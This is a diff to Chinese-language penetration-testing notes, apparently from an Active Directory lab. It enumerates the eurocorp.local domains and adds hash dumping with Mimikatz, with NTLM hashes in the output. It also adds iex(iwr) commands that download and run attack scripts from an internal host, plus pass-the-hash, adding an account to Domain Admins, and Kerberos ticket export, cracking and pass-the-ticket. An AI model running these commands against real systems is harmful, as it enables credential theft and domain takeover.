@@ -2746,6 +2746,10 @@ InfrastructureRoleOwner : eu-dc.eu.eurocorp.local
 Name                    : eu.eurocorp.local
 ```
 
+父域：eurocorp.local
+子域：eu.eurocorp.local
+
+
 枚举eurocorp.local里面的所有用户
 ```
 PS C:\users\public\Downloads> get-netuser -domain eurocorp.local|select cn
@@ -2767,6 +2771,10 @@ PS C:\users\public\Downloads> Get-NetComputer -domain eu.eurocorp.local
 eu-dc.eu.eurocorp.local
 eu-sql.eu.eurocorp.local
 ```
+
+父域DC： eurocorp-dc.eurocorp.local
+子域DC：eu-dc.eu.eurocorp.local
+子域机器： eu-sql.eu.eurocorp.local
 
 
 枚举eurocorp.local DA管理员
@@ -2824,3 +2832,81 @@ PS C:\Windows\system32> hostname
 eu-sql
 PS C:\Windows\system32>
 ```
+
+## 域权限提升
+bypass ps policy和AMSI
+
+引入mimikatz，导出本地所有哈希
+```
+PS C:\users\Administrator\desktop> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : EU-SQL / S-1-5-21-3746007229-4038020768-3333387724
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : cdcfd73ba273d2b6ab67f1fecd83e88e
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   :
+NTLM :
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+```
+开blooodhound，发现本机有DA账号Administrator的session，用Mimikatz导出所有哈希
+
+执行Invoke-Mimikatz获得的哈希
+```
+SQLTELEMETRY: 72653ab8f396dd2228e0cd56b957e4fa
+EU-SQL$: 72653ab8f396dd2228e0cd56b957e4fa
+Administrator:cdcfd73ba273d2b6ab67f1fecd83e88e
+dbadmin: 0553b02b95f64f7a3c27b9029d105c27
+```
+
+但是开一个新的shell进去，发现这个其实是本地的Administrator，感觉blooodhound有时候也不太准啊。。
+
+
+iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
+
+iex (iwr http://172.16.100.66/PowerView_dev.ps1 -UseBasicParsing)
+
+iex (iwr http://172.16.100.66/SharpHound.ps1 -UseBasicParsing)
+
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:eu.eurocorp.local /ntlm:cdcfd73ba273d2b6ab67f1fecd83e88e /run:powershell.exe"'
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:SQLTELEMETRY /domain:eu.eurocorp.local /ntlm:72653ab8f396dd2228e0cd56b957e4fa /run:powershell.exe"'
+
+net group "Domain Admins" dbadmin /ADD /DOMAIN
+
+
+Enter-PSSession eu-sql.eu.eurocorp.local
+
+Enter-PSSession –Computername eu-dc.eu.eurocorp.local –credential eu\Administrator:cdcfd73ba273d2b6ab67f1fecd83e88e
+
+Enter-PSSession eu-dc.eu.eurocorp.local
+
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName eu-dc.eu.eurocorp.local
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+python.exe C:\ad\kerberoast\tgsrepcrack.py C:\ad\kerberoast\10k-worst-pass.txt 
+
+
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\dbadmin\Documents\[0;3e7]-2-0-60a10000-EU-SQL$@krbtgt-EU.EUROCORP.LOCAL.kirbi"'
+
+
+Invoke-Command -ScriptBlock{whoami;hostname} -computername eu-dc.eu.eurocorp.local
